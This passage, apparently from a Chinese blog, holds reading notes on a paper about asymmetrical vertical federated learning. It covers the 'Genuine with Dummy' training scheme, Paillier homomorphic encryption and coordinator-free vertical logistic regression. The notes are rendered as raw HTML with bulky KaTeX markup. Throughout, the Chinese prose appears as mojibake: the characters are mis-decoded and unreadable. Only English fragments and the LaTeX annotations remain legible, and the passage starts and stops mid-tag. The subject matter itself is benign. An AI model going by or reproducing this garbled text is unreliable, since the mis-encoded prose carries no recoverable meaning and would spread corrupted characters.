feature-representation-transferï¼‰</code>æ–¹æ³•å¡«å……è¿™äº›ç©ºç™½ï¼Œä½†æ˜¯åœ¨ç°å®å¾ˆå¤šåº”ç”¨ä¸­ï¼Œæ¯”å¦‚é‡‘èé£é™©ç®¡æ§ä¸­<strong>æ›´å€¾å‘äºé€‰æ‹©å°‘é‡ä½†å‡†ç¡®çš„åŸå§‹æ•°æ®</strong>ã€‚</p><p>å› æ­¤ï¼Œæœ‰å¿…è¦è®¾è®¡èƒ½<strong>å¤Ÿä½¿ç”¨APSIåè®®äº§ç”Ÿçš„åˆ†å¸ƒå¼ç»“æ„ä½œä¸ºè¾“å…¥ï¼Œä½†æ˜¯äº§ç”Ÿä¸SVFLç›¸åŒç»“æœçš„éå¯¹ç§°æ¨¡å‹è®­ç»ƒåè®®</strong>ã€‚æœ¬æ–‡å±•ç¤ºäº†ä¸€ç§<code>å¸¦è™šæ‹Ÿçš„çœŸå®ï¼ˆGenuine with Dummyï¼ŒGWDï¼‰</code>æ–¹æ³•ä»¥å®ç°éå¯¹ç§°æ¨¡å‹è®­ç»ƒã€‚æ³¨æ„æ­¤å¤„éœ€è¦å¼•å…¥<strong>å¯è¡Œç¬¬ä¸‰æ–¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></strong>ï¼›</p><ol><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> äº§ç”Ÿ1ä¸ªå…¬é’¥å¯†ç ç³»ç»Ÿï¼Œå°†å…¬é’¥åˆ†å‘ç»™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å’Œ  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä¸ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> äº¤æ¢ä¸­é—´å˜é‡ä»¥åä½œåœ°è®¡ç®—æ¢¯åº¦å’ŒæŸå¤±ã€‚ å¼±æ–¹ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å°†ä¼šåœ¨çœŸå®äº¤é›†ä¸­çš„æ•°æ®æ ·æœ¬ä¸Šæ­£å¸¸æ‰§è¡Œè¿ç®—è§„åˆ™ï¼Œè€Œåœ¨è™šæ‹Ÿæ ·æœ¬æ‰§è¡Œ<strong>æ•°å­¦æ’ç­‰å¼è¿ç®—</strong>ï¼Œä»¥ä¾¿å®ƒä»¬çš„å­˜åœ¨ä¸ä¼šå½±å“ç›¸å…³è®¡ç®—ç»“æœ</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä¸ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å°†æ•°æ®åˆ†å‘ç»™ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä»¥å®Œæˆæ¢¯åº¦å’ŒæŸå¤±çš„è§£å¯†ï¼Œå¹¶å®Œæˆå±€éƒ¨æ¨¡å‹çš„æ›´æ–°</li></ol><p>ä¸ºäº†è®©å¼ºæ–¹ä¸çŸ¥é“è™šæ‹Ÿæ ·æœ¬çš„å­˜åœ¨ï¼Œä¸€ç§å¯è¡Œçš„æ–¹å¼æ˜¯å®ç°è¯­ä¹‰å®‰å…¨çš„åŠ å¯†æ–¹æ¡ˆï¼Œæ¯”å¦‚<code>PaillieråŒæ€åŠ å¯†</code>ã€‚æ­¤å¤–ï¼Œå› ä¸ºå¼•å…¥çš„æ’ç­‰å¼ä¸¥æ ¼ä¿è¯æ¯ä¸€æ­¥çš„ä¸­é—´ç»“æœä¸å˜ï¼Œä½¿ç”¨GWDæ–¹æ³•å®ç°çš„éå¯¹ç§°æ¨¡å‹è®­ç»ƒå°†è¡¨ç°å‡ºä¸æ ‡å‡†ï¼ˆå¯¹ç§°ï¼‰æ¨¡å‹è®­ç»ƒæ–¹æ¡ˆç›¸åŒçš„æ€§èƒ½ã€‚</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220717154849377.png" alt></p><p>å›¾4å±•ç¤ºäº†GWDæ¶æ„ï¼Œå…¶å±•ç¤ºäº†ä¸€ä¸ªé€šç”¨å­ä¾‹ç¨‹çš„è”é‚¦æ‰§è¡Œè¿‡ç¨‹ã€‚å¼±æ–¹å°†ä¼šå‘é€å¯†æ–‡æ¶ˆæ¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">v_1,v_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ç»™å¼ºæ–¹ï¼Œç„¶åç­‰å¾…æ¥è‡ªå¼ºæ–¹å…³äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>b</mi><mi>r</mi><mi>o</mi><mi>u</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">subroutine(v_1,v_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal">ro</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">in</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> çš„æ‰§è¡Œç»“æœ ã€‚ç”±äºç›´æ¥ä¼ è¾“ä¼šæ³„éœ²çœŸå®IDä¿¡æ¯ã€‚å› æ­¤ï¼Œå¼±æ–¹åœ¨å‘é€ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">v_1,v_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> çš„åŒæ—¶ä¼šåŠ ä¸Šå…³äºè™šå‡æ ·æœ¬çš„æ•°å­¦ç­‰ä»·ç¬¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">e_1,e_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ï¼Œæœ€ç»ˆä¼šæ”¶åˆ° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>b</mi><mi>r</mi><mi>o</mi><mi>u</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>s</mi><mi>u</mi><mi>b</mi><mi>r</mi><mi>o</mi><mi>u</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">subroutine(v_1,v_2,e_1,e_2)= subroutine(v_1,v_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal">ro</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">in</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal">ro</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">in</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>ã€‚æ­¤å¤–ï¼Œå¼ºæ–¹ä¼šè¿ç®— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>b</mi><mi>r</mi><mi>o</mi><mi>u</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>e</mi><mo stretchy="false">(</mo><mo>â‹…</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">subroutine(\cdot)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal">ro</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord mathnormal">in</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord">â‹…</span><span class="mclose">)</span></span></span></span> ï¼Œ è€Œä¸ä¼šå¯Ÿè§‰çœŸå®IDã€‚</p><p><em>ï¼ˆæ²¡çœ‹æ‡‚å¾—1å’Œ2çš„å…³ç³»ï¼Œä»¥åŠä¸ºå•¥è¦åŠ eï¼‰</em></p><h2 id="Asymmetrical-Vertical-Logistic-Regression">Asymmetrical Vertical Logistic Regression</h2><p>ä¸å¦¨å…ˆçœ‹çœ‹<a href="https://arxiv.org/pdf/1911.09824.pdf">Shengwen Yang, Bing Ren, Xuhui Zhou, and Liping Liu. Parallel distributed logistic regression for vertical federated learning without third-party coordinator. arXiv preprint arXiv:1911.09824, 2019.</a>ä¸­çš„æ— åè°ƒè€…çš„çºµå‘è”é‚¦é€»è¾‘å›å½’è®­ç»ƒæ–¹æ¡ˆï¼š</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718120809184.png" alt></p><p>Party A æ‹¥æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>A</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Î˜</mi><mi>A</mi></msub><mo separator="true">,</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x_{A}, \Theta_{A}, y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">Î˜</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>ï¼Œè€ŒParty B æ‹¥æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>B</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Î˜</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">x_{B}, \Theta_{B}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">Î˜</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œè¿™äº›æ•°æ®éƒ½æ˜¯ä¸èƒ½ç›´æ¥æ˜æ–‡ä¼ è¾“çš„ã€‚</p><p>Step 3 ä¸­Party A å‘ Party Bä¼ è¾“åŒæ€å¯†æ–‡<span 